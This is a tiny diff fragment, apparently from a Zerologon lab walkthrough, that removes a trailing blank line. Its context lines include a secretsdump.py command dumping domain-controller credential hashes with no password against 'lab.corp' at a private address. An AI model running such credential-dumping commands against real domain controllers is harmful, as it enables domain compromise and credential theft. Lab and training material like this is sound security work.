@@ -346,4 +346,3 @@ chmod 755 *.py
 
 cd ../zerologon-virtualenv/bin/
 secretsdump.py -no-pass -just-dc lab.corp/dc-1\$@192.168.0.20
-
